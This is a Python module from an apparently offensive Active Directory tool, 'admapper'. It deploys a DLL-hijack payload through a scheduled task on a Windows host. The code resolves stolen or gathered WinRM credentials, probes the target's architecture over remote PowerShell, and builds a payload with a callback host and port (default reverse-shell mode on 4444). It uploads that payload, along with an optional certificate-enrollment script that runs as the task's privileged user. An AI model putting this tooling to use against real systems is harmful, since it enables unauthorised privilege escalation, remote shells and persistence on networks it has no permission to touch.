from __future__ import annotations

import json
from dataclasses import dataclass, field
from datetime import UTC, datetime
from pathlib import Path
from typing import TYPE_CHECKING, Any

from admapper.support.connectivity import TargetUnreachableError, format_unreachable_message, require_target_reachable
from admapper.support.output import ConfirmLevel, confirm, print_info, print_success, print_warning
from admapper.models.workspace import OperationMode
from admapper.postex.creds import WinRMCred, resolve_winrm_cred
from admapper.postex.pe_arch import TargetArch, infer_arch_from_monitor_log, normalize_arch, ps_read_pe_arch_script
from admapper.postex.payload import PayloadMode, prepare_hijack_payload
from admapper.winrm.client import WinRMClient, WinRMError
from admapper.winrm.factory import winrm_client_for_cred
from admapper.winrm.upload import remote_file_ok, upload_file

if TYPE_CHECKING:
    from admapper.support.session import Session


@dataclass
class DeployResult:
    op_id: str | None
    remote_path: str
    local_zip: str
    shell_user: str
    run_as_user: str
    task_name: str
    callback_ip: str = ""
    callback_port: int = 0
    enroll_deploy_marker: str = ""
    errors: list[str] = field(default_factory=list)


def _load_json(path: Path) -> dict[str, Any] | None:
    if not path.is_file():
        return None
    return json.loads(path.read_text(encoding="utf-8"))


def _finding_from_scan(scan_data: dict[str, Any]) -> dict[str, Any] | None:
    findings = scan_data.get("findings") or []
    return findings[0] if findings else None


def resolve_hijack_op(
    session: Session,
    *,
    op_id: str | None = None,
    technique: str = "dll_hijack_scheduled_task",
) -> dict[str, Any]:
    ws_path = session.workspaces.path_for(session.workspace.name)  # type: ignore[union-attr]
    scan = _load_json(ws_path / "postex_scan.json") or {}
    finding = _finding_from_scan(scan)

    if op_id:
        ops = _load_json(ws_path / "postex_ops.json") or {}
        for item in ops.get("opportunities") or []:
            if str(item.get("id")) == op_id:
                if item.get("technique") != technique:
                    print_warning(f"op {op_id} technique is {item.get('technique')}, not {technique}")
                merged = dict(item)
                merged["finding"] = finding
                return merged
        raise ValueError(f"opportunity not found: {op_id} — run: admapper postex -w <workspace>")

    if finding:
        return {
            "id": None,
            "technique": technique,
            "target_host": scan.get("dc_ip"),
            "context": scan.get("shell_user"),
            "finding": finding,
        }
    raise ValueError("no hijack finding — run: admapper postex scan -w <workspace>")


def _winrm_client(cred: WinRMCred, session: Session) -> WinRMClient:
    return winrm_client_for_cred(cred, session)


def _resolve_target_arch(
    finding: dict,
    scan: dict,
    *,
    client: WinRMClient | None = None,
    arch_override: TargetArch | None = None,
) -> TargetArch:
    if arch_override:
        return arch_override
    arch = normalize_arch(str(finding.get("target_arch") or ""))
    if arch:
        return arch
    monitor_text = str(scan.get("monitor_log_excerpt") or "")
    if client is not None:
        drop = str(finding.get("drop_path") or r"C:\ProgramData")
        for rel in (r"\Logs\monitor.log", r"\logs\monitor.log", r"\monitor.log"):
            path = f"{drop.rstrip('\\')}{rel}"
            safe = path.replace("'", "''")
            try:
                proc = client.execute(
                    f"if(Test-Path -LiteralPath '{safe}')"
                    f"{{Get-Content -LiteralPath '{safe}' -Tail 20}}",
                    shell="powershell",
                )
                live = (proc.stdout or "").strip()
                if live:
                    monitor_text = live
                    break
            except WinRMError:
                pass
    arch = infer_arch_from_monitor_log(monitor_text)
    if arch:
        return arch
    exe = str(finding.get("executable") or "").strip().strip('"')
    if client is not None and exe.lower().endswith(".exe"):
        try:
            proc = client.execute(ps_read_pe_arch_script(exe), shell="powershell")
            arch = normalize_arch((proc.stdout or "").strip())
            if arch:
                return arch
        except WinRMError:
            pass
    return "x86"


def deploy_dll_hijack(
    session: Session,
    *,
    op_id: str | None = None,
    cred_id: str | None = None,
    lhost: str | None = None,
    lport: int = 4444,
    payload_dll: Path | None = None,
    dry_run: bool = False,
    exclude_ips: set[str] | None = None,
    arch: TargetArch | None = None,
    payload_mode: PayloadMode = "shell",
    enroll_template: str = "",
    enroll_dns: str = "",
    enroll_ca_name: str = "",
    enroll_ca_host: str = "",
) -> DeployResult:
    if session.workspace is None:
        raise RuntimeError("no active workspace")

    op = resolve_hijack_op(session, op_id=op_id)
    ws_path = session.workspaces.path_for(session.workspace.name)
    scan = _load_json(ws_path / "postex_scan.json") or {}
    finding = op.get("finding") or _finding_from_scan(scan) or {}

    drop_path = str(finding.get("drop_path") or r"C:\ProgramData")
    zip_name = str(finding.get("payload_zip") or "payload.zip")
    dll_name = str(finding.get("payload_dll") or "payload.dll")
    task_name = str(finding.get("task_name") or "scheduled task")
    run_as = str(finding.get("run_as_user") or "unknown")
    shell_user = str(scan.get("shell_user") or op.get("context") or "")
    target_host = str(scan.get("dc_ip") or op.get("target_host") or "")

    if not dry_run and session.workspace.mode == OperationMode.AUTO:
        try:
            require_target_reachable(session, host=target_host or None)
        except TargetUnreachableError as exc:
            raise RuntimeError(format_unreachable_message(exc)) from exc

    cred = resolve_winrm_cred(
        session,
        shell_user=shell_user or None,
        cred_id=cred_id,
        host=target_host or None,
    )
    remote_path = f"{drop_path.rstrip('\\')}\\{zip_name}"
    client = _winrm_client(cred, session)
    target_arch = _resolve_target_arch(finding, scan, client=client, arch_override=arch)
    print_info(f"payload arch: {target_arch}")

    mode = session.mode
    msg = (
        f"deploy {zip_name} → {remote_path} via WinRM as {cred.domain}\\{cred.username} "
        f"(task {task_name} → {run_as})"
    )
    if not confirm(
        msg,
        level=ConfirmLevel.WARN,
        mode_auto=mode == OperationMode.AUTO,
        mode_manual=mode == OperationMode.MANUAL,
    ):
        raise RuntimeError("deploy cancelled")

    enroll_profile = None
    if payload_mode == "enroll":
        from admapper.adcs.enroll import load_enroll_profile, validate_enroll_principal

        enroll_profile = load_enroll_profile(
            session,
            template=enroll_template,
            dns_name=enroll_dns,
            ca_host=enroll_ca_host,
            ca_name=enroll_ca_name,
            run_as_user=run_as,
        )
        for warning in validate_enroll_principal(cred.username, machine_template=enroll_profile.machine_context):
            print_warning(warning)
        print_info(
            f"enroll will execute as task user {run_as} when the task runs — "
            f"do not run the enrollment script manually over WinRM as {cred.username}"
        )

    build = prepare_hijack_payload(
        workspace_dir=ws_path,
        dll_name=dll_name,
        zip_name=zip_name,
        lhost=lhost,
        lport=lport,
        payload_dll=payload_dll,
        drop_path=drop_path,
        exclude_ips=exclude_ips,
        arch=target_arch,
        payload_mode=payload_mode,
        enroll_template=enroll_template,
        enroll_dns=enroll_dns,
        enroll_ca_name=enroll_ca_name,
        enroll_ca_host=enroll_ca_host,
        enroll_run_as_user=run_as,
        enroll_profile=enroll_profile,
    )

    print_info(f"local payload: {build.zip_path} ({build.generator})")
    print_info(f"remote target: {remote_path}")
    fetch_host = (build.lhost or lhost or "").strip() or None

    if dry_run:
        print_info("dry-run — skipping upload")
        return DeployResult(
            op_id=op.get("id"),
            remote_path=remote_path,
            local_zip=str(build.zip_path),
            shell_user=cred.username,
            run_as_user=run_as,
            task_name=task_name,
        )

    enroll_marker = ""
    try:
        from admapper.escalate.analyze import record_escalation_step

        record_escalation_step(
            session,
            action="dll_hijack_deploy",
            detail=f"upload {zip_name} via {cred.domain}\\{cred.username} → {remote_path}",
        )
        if payload_mode == "enroll":
            from admapper.adcs.enroll import build_local_enroll_powershell

            enroll_marker = f"=== admapper deploy {datetime.now(UTC).isoformat()} expect={run_as} ==="
            ps = build_local_enroll_powershell(
                template=enroll_template,
                dns_name=enroll_dns,
                ca_host=enroll_ca_host,
                ca_name=enroll_ca_name,
                profile=enroll_profile,
                run_as_user=run_as,
                drop_path=drop_path,
            )
            enroll_remote = f"{drop_path.rstrip('\\')}\\{op.get('id', 'enroll')}.ps1"
            enroll_local = ws_path / "certs" / f"{op.get('id', 'enroll')}.ps1"
            enroll_local.parent.mkdir(parents=True, exist_ok=True)
            enroll_local.write_text(ps + "\n", encoding="utf-8")
            upload_file(client, enroll_local, enroll_remote, http_fetch_host=fetch_host)
            print_success(f"uploaded enrollment script → {enroll_remote}")
            log_remote = f"{drop_path.rstrip('\\')}\\{op.get('id', 'enroll')}.log"
            safe_marker = enroll_marker.replace("'", "''")
            safe_log = log_remote.replace("'", "''")
            client.execute(
                f"Set-Content -LiteralPath '{safe_log}' -Value '{safe_marker}'",
                shell="powershell",
            )

        upload_file(client, build.zip_path, remote_path, http_fetch_host=fetch_host)
        if not remote_file_ok(client, remote_path, expected_size=build.zip_path.stat().st_size):
            raise RuntimeError(
                "upload not verified on target — use interactive evil-winrm: "
                f"upload {build.zip_path.resolve()} {remote_path}"
            )
        print_success(f"uploaded → {remote_path}")
    except WinRMError as exc:
        raise RuntimeError(str(exc)) from exc

    log = {
        "timestamp": datetime.now(UTC).isoformat(),
        "technique": "dll_hijack_scheduled_task",
        "op_id": op.get("id"),
        "remote_path": remote_path,
        "local_zip": str(build.zip_path),
        "callback_ip": build.lhost or lhost or "",
        "callback_port": build.lport or lport,
        "shell_user": cred.username,
        "run_as_user": run_as,
        "task_name": task_name,
        "enroll_deploy_marker": enroll_marker,
    }
    (ws_path / "postex_deploy.json").write_text(
        json.dumps(log, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )

    return DeployResult(
        op_id=op.get("id"),
        remote_path=remote_path,
        local_zip=str(build.zip_path),
        shell_user=cred.username,
        run_as_user=run_as,
        task_name=task_name,
        callback_ip=build.lhost or lhost or "",
        callback_port=build.lport or lport,
        enroll_deploy_marker=enroll_marker,
    )
